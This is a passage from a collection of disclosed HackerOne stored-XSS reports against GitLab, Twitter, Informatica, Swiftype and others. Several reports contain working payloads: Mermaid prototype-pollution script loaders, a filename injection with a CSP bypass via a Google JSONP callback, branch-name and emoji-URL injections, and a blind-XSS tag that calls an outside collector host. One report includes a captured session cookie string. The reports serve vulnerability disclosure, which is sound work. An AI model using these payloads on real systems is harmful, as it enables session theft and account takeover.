- **Disclosed:** 2022-03-16T14:10:07.106Z
- **CVE(s):** -

**Summary (team):**

Slack allows users to upload files to their Workspace to facilitate sharing information between team members as well as with other workspaces. In addition, with the aim of easing access to PDF files, Slack provides its own "PDF Viewer" (https://app.slack.com/pdf-viewer) embedded in the application which renders the PDF contents without requiring the user to download the file to their local computer. Typically, files shared in this way containing special characters will be HTML encoded, so that their contents will not be rendered as HTML or executed as JavaScript code in the browser. Due to a dependency vulnerable to Cross-Site Scripting, if an attacker shared a malicious PDF file via the Upload file option, the Slack "PDF viewer" could have exposed user data. The issue was resolved by patching a vulnerable dependency in the PDF viewer. Slack undertook a thorough analysis and concluded that no customer was impacted by this vulnerability.

---

### [XSS via Mod Log Removed Posts](https://hackerone.com/reports/1504410)

- **Report ID:** `1504410`
- **Severity:** High
- **Weakness:** Cross-site Scripting (XSS) - Stored
- **Program:** Reddit
- **Reporter:** @ahacker1
- **Bounty:** - usd
- **Disclosed:** 2022-03-10T23:18:17.088Z
- **CVE(s):** -

**Vulnerability Information:**

## Summary:
I have discovered an XSS vulnerability regarding the mod notes feature. Specifically, the XSS payload executes when the victim removes a post in a subreddit and opens up the mod notes of the attacker.

## Steps To Reproduce:

1. The attacker creates a new post with the title containing the XSS payload.
2. The victim (mods of the subreddit) then must remove your post.
3. The payload executes when a victim (subreddit mod) opens up your mod notes. Sometimes, the mod notes are displayed when the victim hovers on your profile (this is true when a recent mod action has been taken on the user). 

## Supporting Material/References:

█████
█████

## Impact

Impact Below:

---

### [Blind XSS on Twitter's internal Jira panel at ████ allows exfiltration of hackers reports and other sensitive data](https://hackerone.com/reports/1369674)

- **Report ID:** `1369674`
- **Severity:** Critical
- **Weakness:** Cross-site Scripting (XSS) - Stored
- **Program:** X / xAI
- **Reporter:** @iambouali
- **Bounty:** - usd
- **Disclosed:** 2022-02-12T06:32:18.325Z
- **CVE(s):** -

**Summary (team):**

The researcher demonstrated a vulnerability in Twitter's Jira instance where user supplied information was handled in an improper manner, rendering the application vulnerable to blind XSS. By crafting a bug report and sending it to Twitter it was possible to locate this proof of concept code within Twitter's Jira instance, such that upon viewing by an employee the researcher's proof of concept code would execute. This vulnerability allowed the researcher to obtain information about internal reports stored within Twitter's internal Jira instance.

---

### [SSRF & Blind XSS in Gravatar email ](https://hackerone.com/reports/1100096)

- **Report ID:** `1100096`
- **Severity:** High
- **Weakness:** Cross-site Scripting (XSS) - Stored
- **Program:** Automattic
- **Reporter:** @rockybandana
- **Bounty:** - usd
- **Disclosed:** 2022-01-17T20:44:56.180Z
- **CVE(s):** -

**Summary (team):**

Nathan Cavitt (rockybandana) reported a blind XSS issue in the Gravatar service, which was due to incorrect/insufficient sanitization on adding emails to one's profile. The report was of good quality and the issue was fixed within a couple of days of report.

---

### [Stored XSS via Mermaid Prototype Pollution vulnerability](https://hackerone.com/reports/1280002)

- **Report ID:** `1280002`
- **Severity:** High
- **Weakness:** Cross-site Scripting (XSS) - Stored
- **Program:** GitLab
- **Reporter:** @misha98857
- **Bounty:** 3000 usd
- **Disclosed:** 2021-11-18T02:03:27.229Z
- **CVE(s):** -

**Vulnerability Information:**

### Summary

I am continue investigating #1106238 and found additional vector for prototype pollution and stored xss.

### Steps to reproduce

1. Create an issue in any repository
2. Create mermaid diagram with following payload:
```
%%{init: { '__proto__': {'template': '<iframe xmlns=\"http://www.w3.org/1999/xhtml\" srcdoc=\"&lt;script src=https://gitlab.com/bugbountyuser1/csp/-/jobs/1030502035/artifacts/raw/payload.js&gt; &lt;/script&gt;\">'}} }%%
%%{init: { '__proto__': {'template': '<iframe xmlns=\"http://www.w3.org/1999/xhtml\" srcdoc=\"&lt;script src=https://gitlab.com/bugbountyuser1/csp/-/jobs/1030502035/artifacts/raw/payload.js&gt; &lt;/script&gt;\">'}} }%%
sequenceDiagram
Alice->>Bob: Hi Bob
Bob->>Alice: Hi Alice
```
3. This will pollute template attribute and, for example, if we click on the search bar after the page loaded, XSS will be executed. This still requires minimal user interaction.

### POC

1. Open https://gitlab.com/cataha319/stored-xss/-/issues/2
2. After page loaded, try select search menu on top bar.

{F1391031} {F1391036}

### What is the current *bug* behavior?

Mermaid allows setting __proto__ attribute in the directive which leads to stored XSS.

### What is the expected *correct* behavior?

Mermaid doesn't allow __proto__ attributed to being set in the directive and merged with the config.

### Output of checks

This vulnerability was tested on gitlab.com. On a local Gitlab instance with a newer version(same as gitlab.com) of Mermaid, it works too.

## Impact

An attacker who can add Mermaid diagram to the page will can steal some data or make any actions as user.

---

### [Stored XSS вирус в al_video.php?act=a_choose_video_box](https://hackerone.com/reports/670509)

- **Report ID:** `670509`
- **Severity:** High
- **Weakness:** Cross-site Scripting (XSS) - Stored
- **Program:** VK.com
- **Reporter:** @executor
- **Bounty:** 500 usd
- **Disclosed:** 2021-11-05T15:37:52.714Z
- **CVE(s):** -

**Summary (team):**

XSS в видео.

---

### [Stored XSS в m.vk.com/video](https://hackerone.com/reports/730963)

- **Report ID:** `730963`
- **Severity:** High
- **Weakness:** Cross-site Scripting (XSS) - Stored
- **Program:** VK.com
- **Reporter:** @executor
- **Bounty:** 500 usd
- **Disclosed:** 2021-11-05T15:36:29.897Z
- **CVE(s):** -

**Summary (team):**

XSS в видео.

---

### [Stored XSS in markdown via the DesignReferenceFilter ](https://hackerone.com/reports/1212067)

- **Report ID:** `1212067`
- **Severity:** Critical
- **Weakness:** Cross-site Scripting (XSS) - Stored
- **Program:** GitLab
- **Reporter:** @vakzz
- **Bounty:** 16000 usd
- **Disclosed:** 2021-10-18T05:49:14.373Z
- **CVE(s):** -

**Vulnerability Information:**

### Summary
When rendering markdown, links to designs are parsed using the following `link_reference_pattern`:

https://gitlab.com/gitlab-org/gitlab/-/blob/v13.12.1-ee/app/models/design_management/design.rb#L168
```ruby
    def self.link_reference_pattern
      @link_reference_pattern ||= begin
        path_segment = %r{issues/#{Gitlab::Regex.issue}/designs}
        ext = Regexp.new(Regexp.union(SAFE_IMAGE_EXT + DANGEROUS_IMAGE_EXT).source, Regexp::IGNORECASE)
        valid_char = %r{[^/\s]} # any char that is not a forward slash or whitespace
        filename_pattern = %r{
          (?<url_filename> #{valid_char}+ \. #{ext})
        }x

        super(path_segment, filename_pattern)
      end
    end
```

The `url_filename` match is then used in `parse_symbol`:
https://gitlab.com/gitlab-org/gitlab/-/blob/v13.12.1-ee/lib/banzai/filter/references/design_reference_filter.rb#L75
```ruby
def parse_symbol(raw, match_data)
  filename = match_data[:url_filename]
  iid = match_data[:issue].to_i
  Identifier.new(filename: CGI.unescape(filename), issue_iid: iid)
end
```

Since `valid_char` is anything apart from a forward slash or whitespace, this allows for any other special characters (such as quotes) to be matched.

The final `url` match gets used when creating the link in `object_link_filter`:

https://gitlab.com/gitlab-org/gitlab/-/blob/v13.12.1-ee/lib/banzai/filter/references/abstract_reference_filter.rb#L219
```ruby
url =
  if matches.names.include?("url") && matches[:url]
    matches[:url]
  else
    url_for_object_cached(object, parent)
  end

content = link_content || object_link_text(object, matches)

link = %(<a href="#{url}" #{data}
            title="#{escape_once(title)}"
            class="#{klass}">#{content}</a>)
```

So if a design could be uploaded with a double quote in it's filename, this would cause it to break out of the href attribute.

Normally file uploads would go through workhorse and end up being sanitized by CarrierWave::SanitizedFile, but it's possible when uploading a design to skip the workhorse by using a `Content-Disposition` header such as `Content-Disposition: form-data; name="1"; filename*=ASCII-8BIT''filename.png` which allows for any character to be used as part of the design filename.

Since whitespaces and slashes are still invalid, it's only possible to inject tags without attributes, or inject attributed into the `a` element. 

Injecting attributes can be chained with the `ReferenceRedactor` to replace the node with arbitrary html via the `data-original` attribute:

https://gitlab.com/gitlab-org/gitlab/-/blob/v13.12.1-ee/lib/banzai/reference_redactor.rb#L77
```ruby
def redacted_node_content(node)
  original_content = node.attr('data-original')
  link_reference = node.attr('data-link-reference')

  # Build the raw <a> tag just with a link as href and content if
  # it's originally a link pattern. We shouldn't return a plain text href.
  original_link =
    if link_reference == 'true'
      href = node.attr('href')
      content = original_content

      %(<a href="#{href}">#{content}</a>)
    end
```

For a CSP bypass, the jsonp endpoint of the google api can be used in combination with `setTimeout`:
`https://apis.google.com/complete/search?client=chrome&q=alert(document.domain);//&callback=setTimeout`

### Steps to reproduce

1. Create a new project on gitlab.com
2. Create a new issue
3. Make sure burp or similar is running
4. Upload a new design
5. Edit the request and change the Content-Disposition header to `Content-Disposition: form-data; name="1"; filename*=ASCII-8BIT''bbb%22class%3D%22gfm%22a%3D%27.png`
6. Refresh the page, there should now be a design named `bbb"class="gfm"a='.png`
7. Create a new issue using the design link and the inner html containing a quote:
```
<a href='https://gitlab.com/vakzz-h1/design-xss/-/issues/2/designs/bbb%22class%3D%22gfm%22a%3D%27.png'>
' vakzz=here
</a>
```
8. Looking at the markup you can see the `a` attribute contains everything up to the inner html and then the attribute `vakzz` has also been injected:
```html
<a href="https://gitlab.com/vakzz-h1/design-xss/-/issues/2/designs/bbb" class="gfm" a=".png&quot; data-original=&quot;
' vakzz=here
&quot; data-link=&quot;true&quot; data-link-reference=&quot;true&quot; data-project=&quot;26924211&quot; data-design=&quot;226146&quot; data-issue=&quot;87875440&quot; data-reference-type=&quot;design&quot; data-container=&quot;body&quot; data-placement=&quot;top&quot;
                          title=&quot;bbb&quot;class=&quot;gfm&quot;a='.png&quot;
                          class=&quot;gfm gfm-design has-tooltip&quot;>
" vakzz="here"></a>
```
7. Create a new issue using the design link, this time including the required data attributed to trigger the `ReferenceRedactor` and the payload html encoded in the `data-original`:

```
<a href='https://gitlab.com/vakzz-h1/design-xss/-/issues/2/designs/bbb%22class%3D%22gfm%22a%3D%27.png'>
' data-design="1" data-issue="1" data-reference-type="design" data-original="
  &lt;script src='https://apis.google.com/complete/search?client=chrome&q=alert(document.domain);//&callback=setTimeout'>&lt;/script>
"
</a>
```
8. Save the issue and reload the page

{F1318763}

### Impact
Stored XSS with CSP bypass allowing arbitrary javascript to be run anywhere that markdown could be posted (issues, comments, etc). This could be used to create and exfiltrate api tokens with full access as described in https://hackerone.com/reports/1122227 targeting individuals or specific projects.

### Examples
POC:
https://gitlab.com/vakzz-h1/design-xss/-/issues/3

### What is the current *bug* behavior?
* The `AbstractReferenceFilter` is generating the `link` using string interpolation but the `url` could contain double quotes
* The design model  can have an arbitrary` attribute

### What is the expected *correct* behavior?
* The url should be validated or escaped before being used
* The design model could probably have a validator for the filename

### Relevant logs and/or screenshots

### Output of checks

This bug happens on GitLab.com

## Impact

Stored XSS with CSP bypass allowing arbitrary javascript to be run anywhere that markdown could be posted (issues, comments, etc). This could be used to create and exfiltrate api tokens with full access as described in https://hackerone.com/reports/1122227 targeting individuals or specific projects.

---

### [Stored XSS in main page of a project caused by arbitrary script payload in group "Default initial branch name"](https://hackerone.com/reports/1256777)

- **Report ID:** `1256777`
- **Severity:** High
- **Weakness:** Cross-site Scripting (XSS) - Stored
- **Program:** GitLab
- **Reporter:** @joaxcar
- **Bounty:** 3000 usd
- **Disclosed:** 2021-09-15T13:44:00.162Z
- **CVE(s):** -

**Vulnerability Information:**

### Summary

A stored XXS exists in the main page of a `project`. By changing the "default branch name" of a group a malicious user can inject arbitrary JavaScript into the main page of a project. Any user that is either at least developer of the project, or an administrator of the GitLab instance, and access the project URL will trigger the payload.

The field "default branch name" under https://gitlab.com/groups/group_name/-/settings/repository accepts arbitrary text (long JavaScript strings as an example). When a project without a initial repository is created in the group the developers are presented with an information page with example terminal commands to execute to set up a repository. This information includes two unzanatized inclusions of the "default branch name", resulting in execution of the JavaScript payload.
{F1371756}

As a default self-hosted GitLab instance does not enforce any CSP rules any javascript can be called. Including inclusion of external script files (<script src="external_script"></script>). On GitLab.com I have not been able to bypass the CSP except from changing the `base-uri` which causes all links on the page(including navigation bars) to point to the attackers site (with payload `<Base Href="attacker_site">`).

On a self-hosted instance without proper CSP I was able to generate `personal access tokens` from the victim that could be extracted by the attacker to get complete access to the victims content and actions. If the victim is an Administrator this leads to complete access to the system. (I will post a script PoC when I have cleaned it up)

As I mentioned, the victim needs to be at least a `Developer` on the project (if not a site admin) when accessing the project main page. This is not a problem (rather an asset) for the attacker. All the attacker needs to do is invite targeted victim users as `Developers` to the project. This will trigger GitLab to send out information to the victim (emails or notifications) that will work as validated phishing links (see image below). The victim just need to click the link in the email and land on the project main page.
{F1371755}

### Steps to reproduce

1. Create two users, `attacker01` and `victim01`
2. Log in as `attacker01`
3. Create a group `attack_group` by visiting https://gitlab.domain.com/groups/new#create-group-pane
4. Go to https://gitlab.domain.com/groups/attack_group/-/settings/repository and expand the "Default initial branch name" tab
5. Enter `<script>alert(1);</script>` as "Default initial branch name" and click "save changes"

{F1371757}

6. Go to https://gitlab.domain.com/groups/attack_group and click the button "New project" and choose to create a "Create blank project"
7. Name the project `attacking_project` and click "Create project"
8. Now the project will load and the alert should pop up.

{F1371758}

optional:
9. On the project main page click the "Invite members" button and invite `victim01` as a Developer
10. Log in with `victim01`
11. Visit https://gitlab.domain.com/attack_group/attacking-project and the script will run for the victim as well

### Impact

Stored XXS capable of arbitrary script execution. Impact depends on the instance CSP settings.

### Examples

If an administrator of GitLab.com visit https://gitlab.com/attack_xxs_group/test3 (a private group and project) one can see that ALL links on the site (all navigation and actions) are redirected to google.com. This is caused by the payload `<Base Href="//www.google.com">`

### What is the current *bug* behavior?

Arbitrary JavaScript is executed on a project main page

### What is the expected *correct* behavior?

The branch name should be sanitized and checked for bad input, and the included branch name should be sanitized when displayed.

### Output of checks

This bug happens on GitLab.com

But CSP removes most of the impact

#### Results of GitLab environment info

I did not manage to run the environment script. I tried this on a Azure hosted GitLab server created from the Azure store.

## Impact

Stored XXS capable of arbitrary script execution. Impact depends on the instance CSP settings. If CSP is not properly set the attacker can execute arbitrary commands as the victim and/or generate `personal access tokens` for full account access. If an Administrator gets compromised, this could lead to complete instance access.

On GitLab.com an attacker can change the `base-uri` to make all links redirect to the attacker's site

---

### [[Swiftype] - Stored XSS via document field `url` triggers on `https://app.swiftype.com/engines/<engine>/document_types/<type>/documents/<id>`](https://hackerone.com/reports/1245787)

- **Report ID:** `1245787`
- **Severity:** High
- **Weakness:** Cross-site Scripting (XSS) - Stored
- **Program:** Elastic
- **Reporter:** @superman85
- **Bounty:** - usd
- **Disclosed:** 2021-08-03T17:12:57.921Z
- **CVE(s):** -

**Vulnerability Information:**

Dear Team,

I have found a stored XSS when create a document via API-based engine. The XSS payload stored in `url` field. 
To understand about document schema for API-based engine, please go to https://swiftype.com/documentation/site-search/guides/schema-design#api-based

After indexed a document with XSS payload stored in `url` field. When view the document details, click on link `View on your site` the XSS will triggered.

Step to reproduce
===

1 - Create a trial account on https://app.swiftype.com/ my admin account email is `qwerty.chan8@gmail.com`
2 - Create a API-based Engine by visit https://app.swiftype.com/engines/api , choose a Engine name and DocumentType Name and click Create Engine.For example in my case (Engine: **123**, DocumentType: **test**)

{F1355460}

3 - Go to https://app.swiftype.com/settings/account and obtain your API Key for example in my case: **gB7BT3iA3GhqoU_SWoRq**

{F1355464}

4 - Call API to create a document follow curl command below, store XSS payload `javascript:alert(1)` in `url` and `thumbnail_url` field value

```
curl -X POST 'https://api.swiftype.com/api/v1/engines/123/document_types/test/documents.json' \
  -H 'Content-Type: application/json' \
  -d '{
        "auth_token": "gB7BT3iA3GhqoU_SWoRq",
        "document": {
          "external_id": "v1uyQZNg2vE",
          "fields": [
            {"name": "url", "value": "javascript:alert(1)", "type":  "enum"},
            {"name": "thumbnail_url", "value": "javascript:alert(1)", "type": "enum"},
            {"name": "channel_id", "value": "UCK8sQmJBp8GCxrOtXWBpyEA", "type": "enum"},
            {"name": "title", "value": "How It Feels [through Glass]", "type": "string"},
            {"name": "caption", "value": "Want to see how Glass actually feels?...", "type": "text"},
            {"name": "tags", "value": ["glass", "wearable computing", "google"], "type": "string"},
            {"name": "category_name", "value": "Science & Technology", "type": "string"},
            {"name": "category_id", "value": 28, "type": "enum"},
            {"name": "published_at", "value": "2013-02-20T10:47:18", "type": "date"},
            {"name": "duration", "value": 136, "type": "integer"},
            {"name": "view_count", "value": 14599202, "type": "integer"},
            {"name": "like_count", "value": 75952, "type": "integer"}
          ]
        }
     }'
```
5 - Go to Engine **123** and click on Manage -> Content or https://app.swiftype.com/engines/123/document_types/test/documents#q=&page=1

{F1355463}

6 - Click on document ID **v1uyQZNg2vE** you just created, you can see the document details

{F1355462}

7 - Click on the link `http://javascript:alert(1)` in document details

{F1355461}

{F1355465}

## Impact

Steal other users sessions, trick users go to unwanted websites

---

### [Improper Sanitization leads to XSS Fire on admin panel](https://hackerone.com/reports/1011888)

- **Report ID:** `1011888`
- **Severity:** High
- **Weakness:** Cross-site Scripting (XSS) - Stored
- **Program:** Informatica
- **Reporter:** @montypythin
- **Bounty:** - usd
- **Disclosed:** 2021-08-03T11:32:02.985Z
- **CVE(s):** -

**Vulnerability Information:**

# Summary
Because the HTML is not sanitized when taking the input on https://accounts.informatica.com/registration.html,  the input is vulnerable to XSS. When a payload such as 
```"><script src=https://monty.xss.ht></script>``` 
is put into the form under company it triggers a blind xss. When the payload successfully is loaded, it dumps information as a POC.

# Steps to reproduce
1) Goto https://accounts.informatica.com/registration.html and create a temporary account
2) Enter a blind xss payload into the Company field
3) Wait until an admin opens the user record
4) Then, the report should be generated ( I used https://xsshunter.com/)

#Supporting Materials
As mentioned, the blind XSS gave me the following IP address  who loaded the admin panel:
████████

The URL of where the payload fired:
https://█████████/phnx/driver.aspx?routename=Social/UniversalProfile/UserRecordEdit&TargetUser=480514&FromSearch=True#loaded

This cookie:
```
wm-cseu-id=%22acd409d8-0f55-4dfd-ac79-d604c5af274e%22; _ga=GA1.2.1915629716.1598908964; wm-fgug=true; wm-ueug=%22b904c8fd-f624-4afb-8050-25f31b3b9cea%22; wm-nor=true; _gid=GA1.2.244633304.1603115085; wm-ueuT=%22b904c8fd-f624-4afb-8050-25f31b3b9cea%22; wm-hb={%22sendBaseTime%22:1603115100166}; wm-wmv=%22b904c8fd-f624-4afb-8050-25f31b3b9cea%22; wm-ds-lfb=%22{}%22; wm-ssn=%22758bcf15-12bc-497e-ab66-f82c25747f45%22; wm-ssn-ct=1603118590494; wm-po-q=null; wm-prsst={%22tId%22:-1%2C%22stt%22:0%2C%22step%22:-1%2C%22spn%22:0%2C%22plgd%22:%22%22%2C%22pint%22:null%2C%22splt%22:[]%2C%22sph%22:[]%2C%22igd%22:null}; wm-ds-lbp=%22[]%22; wm-ds-b=%22[]%22; wm-ds-hb=%22[]%22; wm-ds-lbb=%22{}%22; wm-smtp-init={%22type%22:6}; wm-ds-s=%22[]%22; shoppingcart_coupons=%5B%5D; multiVPoll=; c-s=expires=1603207989~access=/clientimg/informatica/*!/content/informatica/*~md5=832a84c8a012e7d42c375195181dde62; amplitude_id_a328ec1895b18ee52643ef53449b6ecbcsod.com=eyJkZXZpY2VJZCI6IjgwYTA3ZDIxLTA3ZDctNDc4Mi1iNzIxLTc2NTkzMDJkYzg3OFIiLCJ1c2VySWQiOiJENDA4OTY2NUE4OTc5REMyQjUyNDhGMkM1NTk2Q0E1MjdEMzVGQUJFMzA2MTc5REQ0NjA5NEUyQUU1QUJCQUMxIiwib3B0T3V0IjpmYWxzZSwic2Vzc2lvbklkIjoxNjAzMTIxMTg3NTM0LCJsYXN0RXZlbnRUaW1lIjoxNjAzMTIxNTkyODA3LCJldmVudElkIjoyMjIsImlkZW50aWZ5SWQiOjIxOSwic2VxdWVuY2VOdW1iZXIiOjQ0MX0=; wm-po-p=13; wm-po-r=13; wm-dmn=csod.com; _gat=1; wm-ds-lb=%22{}%22
```

What the XSS saw:
█████
Note that this is leaking what appears to be another customer's data

The full report:
████████

## Impact

With this blind XSS vulnerability, a malicious actor could download malware, install a keylogger, steal the admin cookie, and learn IPs of the backend servers and softwares. Also as shown by the screenshot it leaks singular user's names and their corresponding email addresses.

---

### [Blind Stored XSS in https://partners.acronis.com/admin which lead to sensitive information/PII leakage](https://hackerone.com/reports/1028820)

- **Report ID:** `1028820`
- **Severity:** High
- **Weakness:** Cross-site Scripting (XSS) - Stored
- **Program:** Acronis
- **Reporter:** @mansishah
- **Bounty:** 150 usd
- **Disclosed:** 2021-07-29T07:54:52.417Z
- **CVE(s):** -

**Summary (team):**

Blind XSS was possible on partners.acronis.com (Tier 3) via several contact form fields. We have seen no signs of the exploitation of this vulnerability.

---

### [Stored XSS in custom emoji](https://hackerone.com/reports/1198517)

- **Report ID:** `1198517`
- **Severity:** High
- **Weakness:** Cross-site Scripting (XSS) - Stored
- **Program:** GitLab
- **Reporter:** @ooooooo_q
- **Bounty:** 3000 usd
- **Disclosed:** 2021-07-19T13:06:59.010Z
- **CVE(s):** -

**Vulnerability Information:**

### Summary

I found Stored XSS with a feature of custom emoji.

This feature hasn't been rolled out yet and need to set feature flags in self management installation. ( https://gitlab.com/gitlab-org/gitlab/-/issues/231317 )


The problem is the code here.
https://gitlab.com/gitlab-org/gitlab/-/blob/v13.11.4-ee/lib/gitlab/emoji.rb#L43

```ruby
    def emoji_image_tag(name, src)
      "<img class='emoji' title=':#{name}:' alt=':#{name}:' src='#{src}' height='20' width='20' align='absmiddle' />"
    end

    ...

    def custom_emoji_tag(name, image_source)
      data = {
        name: name
      }

      ActionController::Base.helpers.content_tag('gl-emoji', title: name, data: data) do
        emoji_image_tag(name, image_source).html_safe
      end
    end
```

Since the `src` value of `emoji_image_tag` is not escaped, it will be XSS.
(The value of `name` is not available for XSS as validation exists.)

### Steps to reproduce

The following steps should to be reproduced in a self-managed installation of gitlab.

 1. Set feature_flag

see https://docs.gitlab.com/ee/administration/feature_flags.html

```
# gitlab-rails console
--------------------------------------------------------------------------------
 Ruby:         ruby 2.7.2p137 (2020-10-01 revision 5445e04352) [x86_64-linux]
 GitLab:       13.11.3 (b321336e443) FOSS
 GitLab Shell: 13.17.0
 PostgreSQL:   12.6
--------------------------------------------------------------------------------
Loading production environment (Rails 6.0.3.6)
irb(main):001:0> Feature.enable(:custom_emoji)
=> true
```


 2. Create group

Create a group to set the custom emoji. For example, `xss_target`.


 3. Create custom emoji

The ability to create custom emoji only exists in graphql api.

Create by sending the following query from the graphiql page of `https://localhost/-/graphql-explorer`.

```
mutation {
  createCustomEmoji(input: 
    {
      groupPath: "xss_target", 
      name:"xssreplace",
      url:"http://aaa#'><img onerror=alert(location) src=.>"
    }) {
    customEmoji {
      id
      name
      url
    }
  }
}
```

{F1302828}

 4. Create project and file

Create a project to display custom emojis and create a `README.md` with the following content.

```
:xssreplace:
```


5. View rendering results in browser

The function of custom emoji replaces the `:xssreplace:` part to become Stored XSS.

### Impact

Stored XSS is possible with gitlab with feature flags set.

### Examples

There is no example because it works only with gitlab with feature flag set.

### What is the current *bug* behavior?

Insufficient escape of `src`.

### What is the expected *correct* behavior?

Escape the value of `src`.

### Relevant logs and/or screenshots

{F1302824}

### Output of checks

GitLab.com doesn't have a feature flag set so it doesn't affect.

#### Results of GitLab environment info

```
# gitlab-rake gitlab:env:info

System information
System:
Current User:	git
Using RVM:	no
Ruby Version:	2.7.2p137
Gem Version:	3.1.4
Bundler Version:2.1.4
Rake Version:	13.0.3
Redis Version:	6.0.12
Git Version:	2.31.1
Sidekiq Version:5.2.9
Go Version:	unknown

GitLab information
Version:	13.11.3
Revision:	b321336e443
Directory:	/opt/gitlab/embedded/service/gitlab-rails
DB Adapter:	PostgreSQL
DB Version:	12.6
URL:		https://gitlab.example.com
HTTP Clone URL:	https://gitlab.example.com/some-group/some-project.git
SSH Clone URL:	git@gitlab.example.com:some-group/some-project.git
Using LDAP:	no
Using Omniauth:	yes
Omniauth Providers:

GitLab Shell
Version:	13.17.0
Repository storage paths:
- default: 	/var/opt/gitlab/git-data/repositories
GitLab Shell path:		/opt/gitlab/embedded/service/gitlab-shell
Git:		/opt/gitlab/embedded/bin/git
```

## Impact

Stored XSS is possible with gitlab with feature flags set.

---

### [Stored-XSS in merge requests](https://hackerone.com/reports/977697)

- **Report ID:** `977697`
- **Severity:** High
- **Weakness:** Cross-site Scripting (XSS) - Stored
- **Program:** GitLab
- **Reporter:** @yvvdwf
- **Bounty:** - usd
- **Disclosed:** 2021-07-13T08:38:52.399Z
- **CVE(s):** -

**Vulnerability Information:**

Hi team,

A stored XSS is existing in the merge requests pages.

### Steps to reproduce

1. In any existing project or create a new project with checking option "Initialize repository with a README"
2. Create a new branch with name `'><iframe/srcdoc='<script/src=/yvvdwf/data/-/jobs/552156057/artifacts/raw/alert.js></script>'></iframe>`, e.g., `git push origin master:"'><iframe/srcdoc='<script/src=/yvvdwf/data/-/jobs/552156057/artifacts/raw/alert.js></script>'></iframe>"`
3. Create a new merge request from the new branch to master
4. When open the merge request being created, you should see an alert

### Impact

This stored-XSS allows attacker to execute arbitrary actions on behalf of victim notably via gitlab API. It occurs automatically without any need of victim's interaction despite gitlab CSP.

### Examples

(the alert occurs although existing of CSP of gitlab)

https://gitlab.com/yvvdwf/store-xss-merge-request/-/merge_requests/1

### What is the current *bug* behavior?

In [_sidebar.html.haml](https://gitlab.com/gitlab-org/gitlab/-/blob/3d10455ebe4d90f3a6c4fd73a0d52aa4506e40f8/app/views/shared/issuable/_sidebar.html.haml#L170), the `source_branch` is not sanitized when using as `title` attribute

```ruby
%span
    = _('Source branch: %{source_branch_open}%{source_branch}%{source_branch_close}').html_safe % { source_branch_open: "<cite title='#{source_branch}'>".html_safe, source_branch_close: "</cite>".html_safe, source_branch: source_branch }
```

### What is the expected *correct* behavior?

`sourche_banch` should be sanitized

### Output of checks

This bug happens on GitLab.com

## Impact

This stored-XSS allows attacker to execute arbitrary actions on behalf of victim notably via gitlab API. It occurs automatically without any need of victim's interaction despite gitlab CSP.

---

### [Stored XSS via Mermaid Prototype Pollution vulnerability](https://hackerone.com/reports/1106238)

- **Report ID:** `1106238`
- **Severity:** High
- **Weakness:** Cross-site Scripting (XSS) - Stored
- **Program:** GitLab
- **Reporter:** @taraszelyk
- **Bounty:** 3000 usd
- **Disclosed:** 2021-07-12T23:00:34.329Z
- **CVE(s):** -

**Vulnerability Information:**

## Prologue

Gitlab supports Mermaid as part of GFM to allow users to generate diagrams and flowcharts from text.

In version 8.6.0, Mermaid added a support of directives to add more controll over styles(themes) applied to the diagrams.

You can read more about how this works here: https://mermaid-js.github.io/mermaid/diagrams-and-syntax-and-examples/directives.html

Syntax for declaring the directive is `%%{init: {<JSON_OBJECT>}}%%`

Directives can be used to overwrite default theme properties like `fontFamily` or `fontSize` to the graph.

Behind the scenes, library takes JSON_OBJECT from directive and merges it with config object. Later that config is used to generate new CSS rules:

```
  let userStyles = '';
  // user provided theme CSS
  if (cnf.themeCSS !== undefined) {
    userStyles += `\n${cnf.themeCSS}`;
  }
  // user provided theme CSS
  if (cnf.fontFamily !== undefined) {
    userStyles += `\n:root { --mermaid-font-family: ${cnf.fontFamily}}`;
  }
  // user provided theme CSS
  if (cnf.altFontFamily !== undefined) {
    userStyles += `\n:root { --mermaid-alt-font-family: ${cnf.altFontFamily}}`;
  }
```

## Vulnerability description

The issue is that directive JSON_OBJECT is lacking proper sanitization which means we can specify `__proto__` attribute to overwrite Object prototype.

For example, if we use following payload, it will add attribute `polluted` to every new object in the application:
```
%%{init: { '__proto__': {'polluted': 'asdf'}} }%%
sequenceDiagram
Alice->>Bob: Hi Bob
Bob->>Alice: Hi Alice
```

I have tried to use it to overwrite config values or other attributes to achieve XSS, but since a new attribute will be accessible in every object, it just breaks the application. 

## Steps to reproduce

1. Create an issue in any repository
2. Create mermaid diagram with following payload:
```
%%{init: { '__proto__': {'polluted': 'asdf'}} }%%
sequenceDiagram
Alice->>Bob: Hi Bob
Bob->>Alice: Hi Alice
```

3. Save the issue. Now when you open this page and click anywhere, you will see that nothing works. In Developer Console you can see a lot of exceptions that are triggered by a polluted prototype.

## PoC
Open https://gitlab.com/bugbountyuser1/dos/-/issues/1/
You will see that you can't comment or perform any action except clicking on the left sidebar links.

{F1200063}

## What is the current *bug* behavior?

Mermaid allows setting `__proto__` attribute in the directive which leads to DOS via prototype pollution.

## What is the expected *correct* behavior?

Mermaid doesn't allow` __proto__` attributed to being set in the directive and merged with the config. 

## Output of checks

This vulnerability was tested on gitlab.com. On a local Gitlab instance with a newer version(same as gitlab.com) of Mermaid, it works too.

## Impact

An attacker who can add Mermaid diagram to the page will make this page broken. Users will not be able to add comments, edit comments, etc.

---

### [Stored DOM XSS via Mermaid chart](https://hackerone.com/reports/1103258)

- **Report ID:** `1103258`
- **Severity:** High
- **Weakness:** Cross-site Scripting (XSS) - Stored
- **Program:** GitLab
- **Reporter:** @taraszelyk
- **Bounty:** 3000 usd
- **Disclosed:** 2021-07-12T23:00:30.698Z
- **CVE(s):** -

**Vulnerability Information:**

## Prologue

Gitlab supports Mermaid as part of GFM to allow users to generate diagrams and flowcharts from text.

In version 8.6.0, Mermaid added a support of directives to add more control over styles(themes) applied to the diagrams.

You can read more about how this works here: https://mermaid-js.github.io/mermaid/#/directives

Syntax for declaring the directive is `%%{init: {<JSON_OBJECT>}}%%`

Directives can be used to overwrite default theme properties like `fontFamily` or `fontSize` to the graph.

Behind the scenes, library takes `JSON_OBJECT` from directive and merges it with config object. Later that config is used to generate new CSS rules:

```
  let userStyles = '';
  // user provided theme CSS
  if (cnf.themeCSS !== undefined) {
    userStyles += `\n${cnf.themeCSS}`;
  }
  // user provided theme CSS
  if (cnf.fontFamily !== undefined) {
    userStyles += `\n:root { --mermaid-font-family: ${cnf.fontFamily}}`;
  }
  // user provided theme CSS
  if (cnf.altFontFamily !== undefined) {
    userStyles += `\n:root { --mermaid-alt-font-family: ${cnf.altFontFamily}}`;
  }
```

## Vulnerability description

Problem is that there is no sanitization of user-supplied values, which are added to `style` tag via `innerHTML` method afterwards:
```
  const stylis = new Stylis();
